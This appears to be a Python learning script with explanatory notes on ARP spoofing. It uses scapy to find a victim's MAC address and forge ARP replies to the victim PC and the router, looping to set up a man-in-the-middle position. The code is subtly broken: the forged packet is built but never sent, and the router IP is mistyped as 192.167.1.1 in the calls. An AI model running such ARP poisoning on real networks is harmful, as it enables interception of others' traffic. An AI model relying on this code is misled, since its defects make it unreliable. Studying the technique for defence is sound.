"""
Machines on a network can identify each other.
Machine M asks for the MAC address of a certain IP address the N-machine
Another network machine may know N's MAC address is with the target IP address, and may respond with it.
Then M will update its own tables that the response MAC address is now tied to the target IP
If this is hijacked, and faked, then the attacker can then impersonate the target, and get packets from M
M is trying to send those packets to N but we trick it to send to us instead.
The attacker can still forward the packets from M to N, so it does not look like anything is wrong.

M = victim
N = router
...attacker

M Sends a request packet  ----->    [man in middle]   <--------- N replies with a response packet

    # arp -a        (see full arp tables of the machine. list of IP/MAC addresses that are connected.
    Internet Address            Physical Address
    192.168.1.1                 a4:c0:6f:25:96:85
    224.0.0.2                   ff:ff:ff:ff:ff:ff

scapy - a library for python, but is ALSO a internal machine on Linux also.

Details seen on:    OneNote --> Python Pentest --> arpspoof
"""

#!/usr/bin/python3

import scapy.all as scapy       # Had to install scapy on the machine also.


def get_target_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)             # Our request, with a port destination of our final target.
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")    # Broadcast packet with our request, sent to entire network.
    finalpacket = broadcast/arp_request                 # Use 2 packets, to create final packet
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]    # We dont need a detailed response, and we only want the first list.
    mac = answer[0][1].hwsrc    # Gather mac address SENT back from the target (now the source of the return packet.
    return mac


def spoof_arp(target_ip, spoofed_ip):   # IP we target, and the ip that we are pretending to be
    mac = get_target_mac(target_ip)     # Sent back from our function.
    """ op=2 implies a return packet,  
        we send to gathered mac-address + it's IP,  
        AND the IP we are pretending to be. """
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)


def main():
    try:                    # Try to spoof the arp on our target
        while True:         # Run while not interrupted.
            spoof_arp("192.167.1.1", "192.168.1.5")     # target = router
            spoof_arp("192.168.1.5", "192.167.1.1")     # target = windows 10 pc
    except KeyboardInterrupt:
        exit(0)




# --------------------------
main()
# --------------------------
